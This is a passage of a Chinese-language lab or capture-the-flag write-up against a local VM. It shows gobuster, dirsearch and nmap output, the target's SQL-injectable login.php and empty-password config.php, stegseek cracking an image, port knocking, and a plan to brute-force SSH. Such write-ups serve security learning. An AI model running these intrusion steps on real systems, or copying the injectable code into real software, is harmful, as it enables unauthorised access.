(@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.179.164</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">10</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              php,jpg,wbpg,html</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/login.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">487</span>]</span><br><span class="line"><span class="symbol">/index.html</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1095</span>]</span><br><span class="line"><span class="symbol">/config.php</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">507</span>]</span><br><span class="line"><span class="symbol">/.htaccess</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/robots.txt</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">33</span>]</span><br><span class="line"><span class="symbol">/.</span>                    (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1095</span>]</span><br><span class="line"><span class="symbol">/home.html</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">11327</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.wbpg</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.php</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.jpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.html</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htm.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.php</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.jpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.html</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.wbpg</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.jpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.html</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.wbpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htgroup.php</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.jpg</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.html</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.php</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.wbpg</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.jpg</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.html</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.php</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htuser.wbpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/3.jpg</span>                (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">61259</span>]</span><br><span class="line"><span class="symbol">/.ht.jpg</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.html</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht</span>                  (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.php</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.ht.wbpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htc.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="params">Progress:</span> <span class="number">81220</span> <span class="symbol">/</span> <span class="number">81225</span> (<span class="number">99.99</span>%)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Finished</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br></pre></td></tr></table></figure></div>
<p>config.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="comment">server with default setting (user &#x27;root&#x27; with no password) */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hackable&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="variable">$conexao</span> = <span class="title function_ invoke__">mysqli_connect</span>(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conexao</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ERROR: Could not connect. &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>login.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$usuario</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$senha</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot; SELECT * FROM usuarios WHERE user = &#x27;&#123;$usuario&#125;&#x27; and pass = &#x27;&#123;$senha&#125;&#x27;&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conexao</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = mysqli_num_rows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#valida莽茫o conta</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;usuario&#x27;</span>] = <span class="variable">$usuario</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: 3.jpg&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;nao_autenticado&#x27;</span>] = true;</span><br><span class="line">	header(<span class="string">&#x27;Location: login_page/login.html&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p>根据代码去&#x2F;login_page&#x2F;login.html路径，发现是一个登录界面用刚才config.php中的代码知道用户名是root，密码为空<br>但是这样子登录之后又给我返回php源代码部分<br>看这个代码登录成功也是给我定位到3.jpg里面了。那我直接获取这个3.jpg然后用stegseek破解一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# stegseek -wl /usr/share/wordlists/rockyou.txt <span class="number">3.</span>jpg         </span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;steganopayload148505.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;3.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure></div>
<p>得到 porta:65535  尝试用这两个端口knock了一下还是不行<br>那就说明我们信息获取还不过，所以继续用别的扫描器试试</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.179.164</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.179.164/_25-02-11_17-49-38.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">38</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">38</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">315</span>B  <span class="operator">-</span> <span class="symbol">/js</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>js<span class="symbol">/</span>               </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">42</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/backup</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>backup<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">42</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">460</span>B  <span class="operator">-</span> <span class="operator">/</span>backup<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/config</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>config<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">507</span>B  <span class="operator">-</span> <span class="symbol">/config.php</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">452</span>B  <span class="operator">-</span> <span class="operator">/</span>config<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">316</span>B  <span class="operator">-</span> <span class="symbol">/css</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>css<span class="symbol">/</span>             </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>KB <span class="operator">-</span> <span class="symbol">/home.html</span>                                        </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">456</span>B  <span class="operator">-</span> <span class="operator">/</span>js<span class="symbol">/</span>                                              </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">46</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">487</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">33</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br></pre></td></tr></table></figure></div>
<p>还真扫出来了其他目录，访问backup目录，得到一个wordlist文件，应该是用来爆破的<br>这里还有一个css目录也是多级目录，访问之后也可以看到文件，得到一个brainfuck加密的密文</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">┌──(root㉿kakeru)</span><span class="literal">-</span><span class="title">[</span><span class="comment">~/tmp</span><span class="title">]</span></span><br><span class="line"><span class="comment">└─# curl http://192</span><span class="string">.</span><span class="comment">168</span><span class="string">.</span><span class="comment">179</span><span class="string">.</span><span class="comment">164/css/2</span><span class="string">.</span><span class="comment">txt</span></span><br><span class="line"><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span> </span><br></pre></td></tr></table></figure></div>
<p>随便找一个在线解密网站得到4444<br>然后将4444 10000 65535 尝试不同顺序knock最后让22端口开放</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap  192.168.179.164</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>)</span><br><span class="line">Host is up (<span class="number">0.00040</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">2</span>A:A3:<span class="number">5</span>A:<span class="number">42</span>:<span class="number">17</span>:<span class="number">24</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.29</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<p>接下来就是用刚才得到的用户名和wordlist爆破ssh了</p>
